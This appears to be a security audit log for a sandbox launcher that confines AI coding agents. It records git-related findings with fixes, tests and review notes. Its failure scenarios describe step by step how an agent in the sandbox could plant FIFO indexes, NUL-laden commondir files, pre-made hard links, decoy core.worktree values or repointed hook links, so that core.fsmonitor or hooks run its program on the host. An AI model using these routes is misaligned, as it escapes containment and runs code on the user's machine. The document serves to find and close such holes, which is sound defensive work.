    - "Already ignored" is a line of the root `.gitignore`, of `info/exclude` or of your global excludes file, as written or plainly spelled (`/.ai-containers/`, `.ai-containers`, and so on), with trailing whitespace trimmed as git trims it (`_proj_ignored_elsewhere()`). The global file is `core.excludesFile` as `git config` gives it outside any repository (a relative one from the work tree's top), else git's default; each file is read as data, within the bound.
    - "Tracked" is the index read with no repository (`_proj_index_tracks()`). That means a throwaway `GIT_DIR`, the object format from the config read with `git config --file`, `core.fsmonitor` and lazy fetches off, and transports refused. It is bounded by version.sh's `_ver_run()`, and runs only where `_ver_git_runs()` says git runs, so a Mac without the Command Line Tools opens no installer.
  - **The trades, as the fix direction stated them:**
    - A broader pattern that covers the copy gets the line once more.
    - A project nested in an enclosing repository gets no line.
    - Where "tracked" cannot be known (git does not run; the index is a FIFO, a link, a sparse index git reads only in part, saying `error:` and exiting 0, or does not read within the bound), no line is added and a `NOTE:` says why and how to skip the step. The inner `.ai-containers/.gitignore` already keeps `sandbox.local.env` out.
    - A `.git` that is a link is not followed, and is named. So is a git directory the sync cannot search: it hides the index, and is not "no index".
    - `core.excludesFile` is not resolved as git resolves it inside the project: a repository's own, or a global one an `includeIf` on the project's path chooses, is not read, because that is reading the project's config. Such a project gets the line.
  - **Not covered:** a `.git` file or `commondir` swapped for a FIFO between the check and the open blocks the sync, as `project-files.sh`'s header says of every such read. Both are bound read-only in a protected repository.
  - **The review of the fix** found three MEDIUM issues, all fixed here: `info/exclude` and the global excludes file were not read (a line was added that git did not need, and came back when removed); a sparse index read in part counted as not tracking the copy; and the FIFO test passed with the regular-file check removed. LOW ones fixed too: the repository-locating variables of the calling shell (`GIT_DIR` in a hook) are unset (`_proj_git_env`), the config read has `GIT_ALLOC_LIMIT`, a trailing tab no longer counts as the line, and scaffold failures in section 6c count.
  - **The re-review** found two MEDIUM issues, both in the tests, and fixed:
    - The macOS case passed with git run for the global excludes file, which on a real Mac opens the installer. It now runs with `GIT_TRACE` and requires that git ran not at all.
    - The controls asserted only that no line appeared, which a `NOTE:` also leaves. They now require silence, and each has an untracked counterpart. Four mutants that survived (the object format never read, a `.git` file never resolved, the common directory never followed, the shim run) are now caught.
    - LOW ones fixed: a relative `core.excludesFile` was read from wherever the sync started; an unsearchable git directory counted as "no index"; a sparse index that lists the copy counted as not known; the sparse case was skipped on git 2.34; `XDG_CONFIG_HOME`, which a developer may export, is unset in the four tests that isolate `HOME`.
    - LOW, kept: `git init --object-format=sha1` fails on git older than 2.29, as `sandbox.sh: _git_index_read()` does there too.
  - **Tests:** section 6c of `tests/test-sync-project.sh`, which runs in a subshell of its own.
    - Red on the code before the fix: a FIFO index, an included `core.fsmonitor` (which must not run), and the macOS shim.
    - Red on the fix as first written: a sparse index, `info/exclude`, a `core.excludesFile` reached through a link, git's default global excludes file, a `.git` link and a trailing tab (the first review's); a sparse cone that holds the copy, a relative `core.excludesFile` and an unsearchable git directory (the re-review's).
    - Pinned, and seen red on a mutant: the time bound (a `git` that sleeps on `ls-files`), the FIFO's NOTE, the shim never run, and the controls.
  - **Controls:** a linked worktree, a sha256 repository and a sha256 linked worktree, each tracking the copy and not, a linked worktree its main repository's `info/exclude` ignores, and a plain spelling. The two trades are pinned as documented.
- Severity: LOW, by two routes. A hang needs nothing set up: the index stays writable in every protected repository, so the agent can replace `.git/index` with a FIFO in any session. The next launch where git runs says only that it cannot read the index; nothing names what it does to sync. Running a program needs what GIT-28's did: an include into a file the agent can write, which every launch names in a `WARNING:` and allows, or config made where no protection stood (a repository the agent made during a session, which the rescan after it names). Confidence: CONFIRMED (git 2.56: with `.git/index` a FIFO, `git check-ignore -q .ai-containers` and `git ls-files -- .ai-containers` hung, 124 from `timeout 5`, while `git rev-parse --is-inside-work-tree` returned 0; a `core.fsmonitor` set through an include ran on the first two and not on rev-parse; rev-parse does read the includes, and one that is a FIFO hung it)
- Location: `project-files.sh: ensure_ai_containers_ignored()`, run by `sync-to-projects.sh` for every project on every sync and by `project-init.sh`.
- Introduced: `c094411` (2026-06-12, `check-ignore` in both scripts) and `78a6175` (2026-08-05, `ls-files` in sync), before the window; `b0d18f6` (2026-10-26, `ls-files` in init, the fix for PRJ-4).
- What's wrong: to decide whether to add `/.ai-containers/` to the project's `.gitignore`, the function asks git whether the project is a work tree, whether `.ai-containers` is already ignored, and whether anything under it is tracked. `check-ignore` and `ls-files` read the project's config whole, includes and all, with no bound, and refresh the index through `core.fsmonitor`. The project is the agent's to write. This is the pattern GIT-25, GIT-26 and GIT-28 removed elsewhere. Nothing asks first whether git runs either, so on a Mac without the Command Line Tools every sync and init opens the installer (`/usr/bin/git` is the shim; PLAT-7).
- Failure scenario: in a session, the agent replaces the project's `.git/index` with a FIFO. Every later `./sync-to-projects.sh` hangs at that project, with no bound and no message, and so does `./project-init.sh` run on it again. Or the project's `.git/config` includes a file in the work tree, which every launch warns about and allows; the agent writes `[core] fsmonitor = <program>` into that file, and the next sync runs the program on the host.
- Fix direction, for a decision:
  - **A (recommended): ask git nothing about the project's repository.** A work tree is a `.git` directory or file at the project root, read as GIT-26 reads one. "Already ignored" becomes "the root `.gitignore` already holds the line". "Tracked" is read from the index alone, with no repository, as `sandbox.sh: _git_index_read()` reads one: a throwaway `GIT_DIR`, the project's index as `GIT_INDEX_FILE`, a time bound. That still runs git, so only where git runs, which sync and init would have to ask as `_git_usable()` does (they do not source sandbox.sh). The trade-offs: a project that ignores `.ai-containers` by a broader pattern gets the line once more; a project nested in an enclosing repository (a monorepo directory) has no `.git` of its own and gets no line, so its `.ai-containers/` shows as untracked; and A needs a rule for when "tracked" cannot be read (git does not run, or the read is cut off): adding the line hides newly synced files of a project that tracks them (PRJ-4), and not adding it leaves `.ai-containers/` untracked.
  - **B: only at init.** Keep the git calls in `project-init.sh` behind a check that git runs and a time bound, and drop the backfill from `sync-to-projects.sh`, which has had five months to reach every project. A re-init of a project agents have worked in still runs an included `core.fsmonitor`, and stalls for the length of the bound on a FIFO index.

## 25. Found by GAP-2's slice 2

An Opus reviewer of the slice's new tests, 2026-11-05, at `fd49c3c`, reached a mutant of `_git_runs()` that the slice had called unreachable, through a `commondir` holding a NUL. Following that up found GIT-30. The reviews of its fix and theirs found GIT-31 to GIT-39, the automated security review of the GIT-36/37 fix (`a1b7ce7`) found GIT-40, the review of the GIT-38 fix found GIT-41, and the review of the GIT-39 fix found GIT-42 and GIT-43, the review of the GIT-35 fix found GIT-44 and GIT-45, the automated security review of the GIT-44 fix found GIT-46, and the final review of the GIT-45 fix found GIT-48.

### GIT-30: a commondir, gitdir or .git file is read otherwise than git reads it
- **Status: FIXED** (2026-11-05).
  - **The fix:** every file in sandbox.sh that git takes a path from is read by `_git_ptr_read()`, and only where git and the launcher read it alike: no NUL, and at most the 4096 bytes read. Its trailing CRs and LFs are cut, as git cuts them. A CR or LF inside it is read as git reads it; git writes one for a path that holds it.
  - **What refuses the launch:** a NUL, a longer file, or a worktree's `gitdir` ending in a space or a tab. git cuts those off and never writes them. The refusal goes through `_rd_fail()`, naming the file and saying that git writes one path and a newline there. The rescan after the session says its search was cut short, and the next launch names the file.
  - **Rejected:** parsing such a file the way git does, which GIT-24 and GIT-28 showed keeps failing review.
  - **Tests:** G111 in `tests/test-git-internals-ro-reads.sh`, seen red on the code before:
    - a commondir holding `./\n\0\n` or `.\0/`;
    - a linked worktree's commondir longer than 4096 bytes. Cut there, its `x/../` steps led back to the worktree's own directory. It is also measured in bytes under a UTF-8 locale.
    - a `.git` file, in a mount or above one, with a newline before a NUL;
    - a worktree's `gitdir` ending in a space and a tab;
    - a session that makes one;
    - a commondir ending in CR LF, or holding a CR inside it, which is still read.
  - **Not changed:**
    - the data-only readers named under Location;
    - a commondir or `.git` file the launcher cannot read (mode 000), which it reads as empty where git dies;
  - **Found by its review:** GIT-31 and GIT-32, below.
- **Severity: HIGH.** Confidence: CONFIRMED. Measured with git 2.56, and on the launcher at `fd49c3c` through `tests/lib-git-internals-ro.sh`'s fake docker; a second reviewer reproduced the failure scenario with a real `<newline>` directory.
  - **The harm:** the host's git runs a program the agent chose, and nothing names it. Not the rescan after the session that made the repository, not the launch that then protects it, not any later launch.
  - **What it needs:**
    - a repository the agent made in a session, or one whose `commondir` it could write before any launch protected it;
    - the user running git in it on the host. That is the case the rescan after the session exists to warn about.
- **Location:** every read in sandbox.sh of a file git takes a path from.
  - **Placeholder checks:** sandbox.sh: `launcher_ro_overlay()` checks for the placeholder and refuses a `commondir` other than `./`. Both checks use `$(_rd …)`, which drops NUL bytes. The same function also reads the worktree branch's `cdir` and the cross-mount `commondir`.
  - **The rest:**
    - sandbox.sh: `git_dirs_in()`: a `.git` file's `gitdir:`, `commondir`, `gitdir`;
    - sandbox.sh: `_git_runs()`;
    - sandbox.sh: `_git_index_read()`;
    - sandbox.sh: `_checkout_origin_url()`.
  - **Data only:** version.sh: `_ver_read()` and sandbox-common.sh: `_ac_source_commit()` read such files the same way. They take from them only the version and the source commit they report, and run nothing through them.
- **Introduced:** `5793a34` and `91fac80` (both 2026-10-06). `5793a34` named a `commondir` other than the placeholder in a WARNING, comparing `$(cat "$g/commondir")`, which drops NULs. `91fac80` made that comparison a refusal and the placeholder `./`.
  - **Releases affected:** every one from v0.10.0 to v0.10.7. Those have no rescan after the session and follow no commondir, but the harm is the same: git uses `.git/<newline>/config`, and the launch binds only `.git/config`.
  - **The other readers came later:**
    - `_git_index_read()`'s in `d6fc64f` (2026-10-27);
    - `git_dirs_in()`'s in their present form in `56b43e8` and `86427b0` (2026-10-26, 10-28);
    - `_git_runs()`'s in `7121741` (2026-11-03);
    - `_checkout_origin_url()`'s in `d942daa` (2026-11-04).
- **What's wrong:**
  - **How git reads them:** whole (`strbuf_read_file`). It cuts every trailing CR and LF, then uses the buffer as a C string. The path therefore ends at the first NUL, with whatever CR or LF stands before it.
  - **How the launcher reads them:**
    - most readers read up to the first NUL, then cut trailing CRs and LFs;
    - the `$(_rd …)` checks drop every NUL.
  - **The result:** `./\n\0\n` is `./`, the placeholder, to the launcher. To git it is `./` and a newline: a directory inside `.git` whose name is a newline, which the agent can make.
  - **Truncation:** `_rd 4096` reads 4096 bytes. git reads all of a longer file, and `x/../` steps in it can resolve somewhere else.
  - **A worktree's `gitdir`:** git cuts every trailing whitespace character from it, not only CRs and LFs. The launcher reads it only to add a worktree to check, so a path it misreads is named rather than missed.
- **Failure scenario:**
  1. In a session, the agent runs `git init sub` and writes `./\n\0\n` to `sub/.git/commondir`.
  2. It makes `sub/.git/<newline>/` holding `objects/`, `refs/` and a `config` that sets `core.fsmonitor`.
  3. The rescan after the session says nothing (measured). `sub/.git`'s own config sets nothing, and the new directory has no HEAD, so no scan takes it for a git directory.
  4. The next launch binds `sub/.git/config`, `commondir` and `hooks` read-only and names nothing. `sub/.git/<newline>/config` stays writable. The one trace is bash's own `warning: command substitution: ignored null byte in input`.
  5. `git status` in `sub` on the host runs the program (measured).
- **Fix direction:** read every such file one way, and accept only what every reader agrees on. That is at most 4096 bytes, with no NUL, and no CR or LF except at the end; for a `gitdir`, no other whitespace at the end either. Anything else is named and refuses the launch, as a FIFO there does. This replaces parsing such a file as git would, which GIT-24 and GIT-28 showed keeps failing review.

### GIT-31: a hard link made before the first protection keeps a protected file writable
- **Status: FIXED** (2026-11-05). Found by the review of the GIT-30 fix.
  - **The fix:** `_ro_fifo_search()`, which runs at the end of the overlay pass and again just before docker, now also refuses the launch on a git-internal file the launch binds read-only that has more than one hard link. That covers `config`, `config.worktree`, `commondir`, a `.git` file, and anything under `hooks/`.
  - **After two reviews of that fix**, the design is simpler (the user's choice, 2026-11-05):
    - **Every git directory the scan finds is checked by name,** protected or under a read-only overlay: `config`, `config.worktree`, `commondir`, a `.git` file, and in `hooks/` the names git runs, through a link too. A repository inside a planted launcher had had no check of its own, so two empty files hid its hard-linked config.
    - **A repository under a read-only overlay is held to the rules of a protected one,** without binds. A `commondir` other than `./` refuses the launch. Its includes, hooks path and links are judged after the pass, and a linked `config` among them is named if it leads where the agent can write.
    - **A link counts only when it leads into a writable mount.** The Nix store links every file it holds, and a hook linked there refused every launch.
    - **A link or include whose target has a second name in a writable mount** counts as one the agent can change (`_walk_exposed()`).
    - **The refusal names the `find <mount> -xdev -samefile <file>`** that lists the other names. Its first advice, to copy the file over itself, wrote through a link the agent could plant beside it, into a file of yours.
    - **Tried and dropped:**
      - Checking every file of a launcher overlay except a git directory's objects. The exemption was a path the agent could choose, and it refused a launcher file deduplicated with another project's copy.
      - Recording the protected files before docker and naming any that changed after it. That missed hooks made during the session and saw only that window, at four process spawns per hook.
  - **Not covered:**
    - **A container that has the repository writable,** a sibling launched before it was protected, can write these files directly, read-only bind or not.
    - **A repository outside every writable mount** (`:ro`, or not mounted) whose files have a second name inside one.
    - **Through a link that leads out of every writable mount,** another name is searched for only on the target's device, since a hard link never crosses one. One bounded `find -xdev` lists each writable mount on that device's files with a second name, once per launch, within the search's budget, and every such file is looked up in it (a `find -samefile` per mount until GIT-39's fix, which shares the listing with the include check). A listing that fails or runs out of time counts as a name found.
      - **History:** fixed with GIT-37, after an automated security review: where the target lay had decided it before, and a name an earlier session made in a wider mount went unseen.
      - **Corrected after the next review:** a search per hook let the agent make each launch take hours, and one that failed on a directory the agent made unreadable was taken for "no other name".
      - **Still missed:** a name in a mount nested inside a writable mount, which `-xdev` does not enter, or on overlayfs, where a file's `st_dev` may differ from its directory's.
  - **Known costs:**
    - **Deduplicating tools:** util-linux `hardlink`, `jdupes -L` and `rdfind` link identical `config` files, `./` placeholders and empty `config.worktree` files across repositories, and the launch then refuses. The other name may be another repository's own file: copy it apart rather than remove it.
    - **An unreadable directory:** where a writable mount holds one the launching user cannot read (another user's data directory), a hook that links into the Nix store refuses the launch, because the search for its other names fails there.
  - **A mutation pass** over the changed lines left 25 of 121 mutants alive. Most are in the checks of repositories under an overlay, which GIT-37 rewrites; about a dozen are equivalent.
  - **Tests:** G112 in `tests/test-git-internals-ro-reads.sh`, each seen red on the code before:
    - the five kinds of file with a second name;
    - a repository inside a planted launcher: its config with a second name, linking into `objects/` with a second name, or a commondir into its `objects/`;
    - such a config linking into the writable tree;
    - a hook that links to a `.sample` with a second name;
    - a hook leading into a planted launcher's `objects/`;
    - a link made between the overlay pass and docker;
    - the controls, which launch:
      - a launcher's git objects with two names;
      - a deduplicated `.sample`;
      - a launcher file deduplicated with one outside every mount;
      - a hook and an include whose two names both lie outside every mount;
      - a file whose other name was removed.
- **Severity: HIGH.** Confidence: CONFIRMED. The reviewer probed it two ways:
  - **Kernel probe** (`unshare -rm`, read-only binds of `config` and `commondir`): a direct write failed with "Read-only file system", and so did a new `ln` ("Invalid cross-device link"). A write through a link made before the bind succeeded, and the host's `git status` then ran the program.
  - **Harness probe** (`tests/lib-git-internals-ro.sh`'s fake docker): the whole failure scenario below, with nothing named at any step.
- **Location:** sandbox.sh: `launcher_ro_overlay()`. Every regular file it binds read-only is affected: `config`, `config.worktree`, `commondir`, what `hooks/` holds, and `.git` files.
- **Introduced:** with the git-internals protection (`5793a34`, 2026-10-06), so in every release since v0.10.0.
- **What's wrong:**
  - A read-only bind protects a path, not the inode behind it. A hard link made before the bind writes the same inode through another path.
  - `link()` into a read-only bind fails with EXDEV, so only a link made before a repository's first protection matters. Such a link exists in a repository the agent made in a session.
  - The rescan after the session names such a repository only if its config or hooks already run something, and a plain one does not.
  - Every later launch takes it for protected and reported.
- **Failure scenario:**
  1. In a session, the agent runs `git init r` and `ln r/.git/config r/notes.txt` (and the same for a hook). The rescan names nothing.
  2. The next launch binds `r/.git/config` read-only.
  3. In a later session the agent appends `[core] fsmonitor = <program>` through `r/notes.txt`. Nothing is named.
  4. `git status` in `r` on the host runs the program.
- **Fix direction:** when a repository is protected, refuse, or name, any regular file the launch binds read-only whose link count is above 1. That covers `find … -type f -links +1` over `hooks/` too. A check at launch is enough, because of EXDEV.

### GIT-32: core.worktree and a gitdir's back-pointer are resolved with a logical cd
- **Status: FIXED** (2026-11-05). Found by the review of the GIT-30 fix.
  - **The fix:** a submodule's `core.worktree` is resolved with `cd -P --`, and a relative one through `./`. Otherwise `cd` takes `-` for its previous directory, where git uses a directory named `-`.
  - **After the review of that fix:** `core.hooksPath` and the directory a second-level include is relative to are also resolved physically (G114).
  - **The trailing newline:** a value is read as git has it, up to its NUL (`_git_config_get()`). Every path the launcher resolves from a name the agent controls goes through `_cd_phys()`, which reads `$PWD` up to a NUL. `$(cd …; pwd -P)` dropped a trailing newline, so `core.worktree = ../wt<newline>`, or a `gitdir:` through a link to such a name, was read as a decoy without one. The paths that come from your own configuration (mount sources, `$HOME`, the group root) still use `$(…)`.
  - **Tests:** G113 in `tests/test-git-internals-ro-index.sh` and G114 in `tests/test-git-internals-ro-config.sh`, each seen red on the code before:
    - a `core.worktree` through a link, with a decoy where the lexical path leads;
    - a `core.worktree` of `-`, whose nested submodule lies deeper than the scan goes;
    - a `core.worktree` ending in a newline;
    - a `gitdir:` through a link to such a name, under a pruned `node_modules/`;
    - a `core.hooksPath` through a link and `..`;
    - a second-level include beside a file reached through a link and `..`.
  - **Left as it was:** the back-pointer's `cd "$back"`. It reads a `.git` file outside every writable mount, which the agent cannot write, and only decides whether a WARNING is quiet.
- **Severity: LOW.** Confidence: LIKELY. The reviewer measured the difference in resolution; the consequence below is reasoned, not run.
- **Location:** sandbox.sh: `git_dirs_in()`, in two places:
  - the submodule's `core.worktree`: `top="$(cd "$g" 2>/dev/null && cd "$wt" 2>/dev/null && pwd -P)"`;
  - the quiet check for a waiting git directory: `cd "$back"`.
- **What's wrong:** git resolves `core.worktree` physically (`chdir`, then `realpath`). `cd` without `-P` takes a `..` after a link lexically. With `core.worktree = ../../../a/../node_modules/sm` and `a -> x/y`, the launcher reads `P/node_modules/sm` and git uses `P/x/node_modules/sm`.
- **Failure scenario** (reasoned):
  - the setup: a repository the agent made in a session, with a submodule under a pruned directory, its `core.worktree` routed through a link, and a decoy directory where the lexical path leads;
  - the effect: the submodule's index is read against the decoy, so a nested submodule's checkout under the real worktree is not protected.
- **Fix direction:** `cd -P --` in both places, as the other resolutions already do.

### GIT-33: a .git directory's own core.worktree was not read
- **Status: FIXED** (2026-11-05). Found by the review of the GIT-31 fix.
- **Severity: HIGH.** Confidence: CONFIRMED. The reviewer probed it end to end: nothing was mounted for the nested repository, and with `core.fsmonitor` set in its config, the host's `git -C r status` ran it.
- **Location:** sandbox.sh: `git_dirs_in()`. It read `core.worktree` only for a submodule's git directory under `.git/modules`. For a repository's own `.git` it read the index against the directory the `.git` lies in.
- **What's wrong:**
  - git takes `core.worktree` for the worktree of a repository. `git -C r rev-parse --show-toplevel` printed `r/w2`. Once a `commondir` exists, the launch's `./` placeholder included, git ignores a `core.worktree` in `config` and takes only one in `config.worktree` (with `extensions.worktreeConfig` on). So past the first protection, this needs `config.worktree`, or a repository the scan reads before its placeholder exists, as the rescan after a session does (re-review of the fix).
  - So a gitlink in `r`'s index whose checkout lies under `w2` was never followed. The nested repository there, under a pruned `vendor/`, kept its config writable.
  - Nothing named it: `core.worktree` is not a key that runs a program.
- **Failure scenario:**
  1. In a session, the agent makes `r` with `core.worktree = ../w2`, a gitlink `vendor/n` in its index, and a repository at `r/w2/vendor/n`.
  2. The next launches protect `r/.git`, but not `r/w2/vendor/n/.git`.
  3. A later session sets `core.fsmonitor` there, and `git status` in `r` on the host runs it.
- **The fix:** a `.git` directory's index is read against its `core.worktree` too, resolved physically, as well as against where it lies. One cannot hide the other. So is a submodule's, and from `config.worktree` too, where git takes it when `extensions.worktreeConfig` is on: a decoy in `config` beside it does not replace it (re-review of the fix). The cases with `core.worktree` in `config` protect what git uses until the placeholder is made; GIT-36 covers what it uses after.
- **Tests:** G113 in `tests/test-git-internals-ro-index.sh`, both cases seen red on the code before.

### GIT-34: a config-based hook was not named as a key that runs a program
- **Status: FIXED** (2026-11-05). Found by the re-review of the GIT-31 fix.
- **Severity: MEDIUM.** Confidence: CONFIRMED: `hook.x.command` with `hook.x.event=pre-commit` ran on a commit, and `_git_exec_keys()` printed nothing for it.
- **Location:** sandbox.sh: `_git_exec_keys()`.
- **What's wrong:** git 2.36 added config-based hooks, `hook.<name>.command`. A repository's first protection names the keys its config already sets that make git run a program, and so does the rescan after the session. Neither named this key.
- **The fix:** `hook.<name>.command` joins the keys. **Tests:** G26 in `tests/test-git-internals-ro-reports.sh`, seen red on the code before.

### GIT-35: two ways a core.hooksPath is judged otherwise than git takes it
- **Status: FIXED** (2026-11-07). Found by the re-review of the GIT-31 fix. The first case was fixed with GIT-39's fix, the rest after it.
- **Severity: MEDIUM** since 2026-11-07, for the link case below; LOW before. The rest need the config written before the repository's first protection, which names `core.hookspath` once.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the post-pass's `core.hooksPath` NOTE.
- **What's wrong:**
  - **A path into a read-only overlay is taken for safe** without walking the hooks there. With `core.hooksPath=../L/node_modules/h` (`L` a planted launcher) and `h/post-checkout` a link to a writable script, every launch after the first is silent. The launcher link walk prunes `node_modules` and `.git`. **FIXED** with GIT-39's fix, which walks the hooks of such a directory (G119).
  - **A relative path is resolved from the directory the `.git` lies in.** git takes it from `core.worktree` when one is set, and expands `~user/` and `%(prefix)/`.
- **Also (2026-11-07, the third review of the GIT-38 fix):** a `core.hooksPath` reached through a link the agent can repoint (`tools -> <outside>`, `core.hooksPath=tools/hooks`) is never named: `_cd_phys()` resolves through the link, while an include's path is walked with `_walk_exposed()`. Walk it the same way.
  - **Why MEDIUM (the re-review of the GIT-39 fix, reproduced):** the agent can silence the NOTE a writable hooks directory gets. It replaces husky's `.husky/_` with a link to any directory of the host, and the next launch is silent, since the path resolves outside every mount. During that session it repoints the link at scripts of its own, and the host's next commit runs them.
  - **And:** a `core.hooksPath` set by an include, or in `config.worktree` with `extensions.worktreeConfig` on, is not read at all (`_git_config_get` reads `config` alone, without includes), so neither the NOTE nor the hook walk sees it. A global `core.hooksPath` works the same way, outside the per-repository scope.
- **Fix:** `core.hooksPath` is judged after the include walk, from the files git reads it from.
  - **Where it is read:** the config, the files it includes that the agent cannot reach, and `config.worktree` where git reads that. The last value of each file is taken, since git takes the last of them all, from the include walk's own read of the file (`_git_walk_keys()`), which costs no read more.
  - **A relative one** is judged from where the `.git` lies and from its `core.worktree`, which git takes from `config` and `config.worktree` alone, never from a file they include.
  - **The whole way is walked as an include's is** (`_path_walk()`, `_walk_exposed()`), the way to a `core.worktree` too. A writable directory gets the NOTE it had. A link the agent can repoint, a directory a `..` steps out of that it can swap, or a way not followed to the end gets a NOTE naming where the hooks are and that step. Every way is judged; only the NOTEs are not repeated.
  - **Written `~user/` or `%(prefix)/`:** named as not judged, since the launcher does not expand those forms. **`:(optional)`:** judged with it, as a git older than 2.52 reads it (part of a relative path), and without it, as 2.52 and later do.
  - **Bounded as the include walk is:** core entries count in a config's budget of 100, each way and each hook walked in a `core.hooksPath` directory in the launch's 1000, past which a `WARNING:` names the repository, and a value of more than 128 components is named once, not walked. A config cut short still has its `core.hooksPath` read, by git. A `core.hooksPath` directory is walked once a launch, however many repositories name it.
  - **The hooks walked:** where neither the directory nor the way is the agent's to change, its hooks are walked as `hooks/`'s are, hook files too (GIT-39). With `core.hooksPath` set, `hooks/`, which git does not run, is not, unless the value is `:(optional)`, which git falls back from, or comes from an `includeIf`, whose condition may not hold.
- **The review of the fix** found, and these are fixed:
  - **The way to a `core.worktree` was resolved, not walked** (MEDIUM, a regression): a submodule whose checkout the agent moved aside and replaced with a link to a directory of the host was silent, where the code before named it at the wrong path. Repointed in the session, its hooks ran on the host's next commit.
  - **Any `core.hooksPath` stopped the walk of `hooks/`,** one from an `includeIf` whose condition does not hold included, and `:(optional)` was judged as part of the path.
  - **A way was skipped as named before it was judged,** when another way reached the same hooks.
  - **Two reads more per config file** cost 150 repositories of six includes 27% more.
  - It also found GIT-44 and GIT-45, older than this fix.
- **The re-review of the fix** found, and these are fixed:
  - **The ways had no budget** (MEDIUM): every included file added its `core.hooksPath` and its `core.worktree`, each value was walked from every base, and none of the include walk's limits applied. A planted repository took a launch from 0.9 s to 64 s and printed 1600 NOTEs; 25 with short values, 72 s where they took 14. And git never takes `core.worktree` from an included file.
  - **A `core.hooksPath` past the point where its config's walk was cut was lost** (a regression): the code before named it.
  - **`:(optional)` was taken off whatever the git**: Ubuntu 24.04's 2.43 and Apple's git read it as part of a relative path, which the agent can make (a regression).
  - **The docs claimed every worktree git may run hooks in:** a linked worktree's checkout and `config.worktree`, and a separate git directory's checkout, are not judged. GIT-44 now holds them.
- **The third review of the fix** found, and these are fixed:
  - **The hooks of every way judged safe were walked, with no budget and no word** (MEDIUM): a directory per way, the same one again for every repository naming it, 28 names each. Two planted repositories whose ways led to directories of long link chains took a launch from 1.7 s to 161 s, in silence.
  - **`:(optional)` came in git 2.52, not 2.51,** and the launcher asked a version of whichever git it found: a host can hold two. Both readings are judged now, whatever the git.
- **The automated security review of `fe955c3`,** the commit of this fix, found that a launch budget spent on `core.hooksPath` directories also skipped the repository's own `hooks/`, walked when a value came from an `includeIf` or was written `:(optional)`, though it was never counted: planted repositories could spend the budget to hide a hook link there. Fixed with GIT-44: past the budget only those directories are skipped (G120).
- **Not covered:**
  - A linked worktree's or a separate git directory's checkout as a base, a linked worktree's own `config.worktree`, and a git directory outside every mount whose worktree is mounted: FIXED as GIT-44.
  - `$GIT_DIR`, where push hooks run, as a base for a relative path (GIT-45).
  - A global `core.hooksPath`, outside the per-repository scope.
- **Tests:** G120 in `tests/test-git-internals-ro-config.sh`, each seen red on the code before:
  - a husky `.husky/_` made a link to a directory of the host;
  - a `..` out of a directory the agent can swap;
  - set by an included file, and in `config.worktree`;
  - relative to a `core.worktree`;
  - a `~user/` form;
  - two ways to the hooks the agent can change at the same step, named once;
  - a submodule's `core.worktree` made a link the agent can repoint;
  - a way the agent can change, though another way reaches the same hooks;
  - a value from an `includeIf`, and one written `:(optional)`, leaving `hooks/` judged;
  - no read of `core.hooksPath` of its own;
  - a `core.worktree` from an included file, which git ignores, no base;
  - a value of 200 components, named once and not walked; one longer than git can open, not named; a link loop, named once;
  - the launch's budget, and a repository past it named;
  - a `core.hooksPath` past a config's cut, and 150 core entries counted in the config's budget;
  - a value written `:(optional)`, judged with it and without it;
  - a `core.hooksPath` directory two repositories name, walked once; hooks past the launch's budget, the repository named;
  - with `core.hooksPath` set, a link in `hooks/` not named;
  - a link under a read-only overlay to a directory outside every mount, not named.
  - The first case is G119's "a hook link in a core.hooksPath under a read-only overlay" in `tests/test-git-internals-ro-reads.sh`.
- **Mutants:** 39 by hand, over the fix and three reviews' fixes, all killed but one (two of them aimed at a version check since removed): reading `config` first as well as through the include walk matters only for a `config` that is a link, which is warned about by name. It is kept, as the code before read through one.

### GIT-36: the worktree an index is read against is not every one git may use
- **Status: FIXED** (2026-11-06). Found by the review of the simplified GIT-31 fix.
  - **The fix:** every git directory's index is read against every worktree git may use, each beside the others, so a decoy can add one and never replace one:
    - where a `.git` directory lies;
    - its `core.worktree` from `config` and from `config.worktree`;
    - for any but a `.git` directory, the directories of the `.git` files naming it, and a linked worktree's `gitdir`, at most twenty (`git_dirs_in()`).
  - **After the review of that fix:**
    - **A `.git` directory takes the directories of the `.git` files naming it too.** git uses that directory as the worktree for any git directory it names. A late `.git` file reads it again.
    - **A linked worktree takes the common config's `core.worktree`,** resolved from its own git directory. git applies it when `extensions.worktreeConfig` is on.
  - **Tests:** G115 in `tests/test-git-internals-ro-index.sh`, each seen red on the code before:
    - a submodule with a decoy `core.worktree`, on the launch after its placeholder;
    - a linked worktree's `core.worktree` in `config.worktree`;
    - a `.git` directory named by a `.git` file elsewhere;
    - the common config's `core.worktree` for a linked worktree.
- **Severity: HIGH.** Confidence: CONFIRMED. The reviewer's end-to-end probes ran the agent's `core.fsmonitor` through the user's own `git status`.
- **Location:** sandbox.sh: `git_dirs_in()`, where it chooses the worktree tops an index is read against.
- **What's wrong:**
  - **A submodule's git directory under `.git/modules`** takes its `core.worktree` in place of the directories of the `.git` files that name it. Once the launch makes the `./` placeholder, git ignores a `core.worktree` in `config` and uses the `.git` file's directory. A decoy `core.worktree` therefore leaves the real checkout's submodules unread, under a pruned `vendor/` or `node_modules/`.
  - **A linked worktree's or a separate git directory's `core.worktree`** in `config.worktree`, which git honours when `extensions.worktreeConfig` is on, is never read. git's sparse-checkout cone mode turns that extension on.
- **Failure scenario:**
  1. In a session, the agent makes `.git/modules/new` with `core.worktree=../../../decoy`, a `new/.git` file naming it, and a repository at `new/vendor/n` recorded as a gitlink in the module's index.
  2. The next launch protects `.git/modules/new` and mounts nothing under `new/vendor/n`.
  3. The agent sets `core.fsmonitor` there, and `git status` in the project on the host runs it.
- **Fix direction:** read every git directory's index against every worktree git may use, each a decoy can add to and none can replace:
  - where a `.git` directory lies;
  - its `core.worktree` from `config` and from `config.worktree`;
  - the directories of the `.git` files naming it;
  - a linked worktree's `gitdir`.

### GIT-37: repositories under a read-only overlay are judged only with objects/ and a config
- **Status: FIXED** (2026-11-06). Found by the review of the simplified GIT-31 fix.
  - **The fix:** every git directory under an overlay joins the post-pass. Where it has a `commondir` other than `./` it takes its common directory's config, even with a `config` of its own, which git ignores: a decoy one there hid its `config.worktree` (review of the fix). A link at any name git reads is named, whatever it leads to.
  - **The hooks link check:** one bounded `find` per kind, within the search's budget. One that runs out of time refuses the launch, as the FIFO search does; an automated security review flagged it failing open.
  - **Tests:** G116 in `tests/test-git-internals-ro-reads.sh`, each seen red on the code before:
    - a dangling `config` link;
    - a repository with no `config` and a hook link;
    - a worktree-shaped directory whose `config.worktree` includes a writable file, with and without a decoy `config` beside it;
    - a `commondir` link;
    - a hooks check that runs out of time.
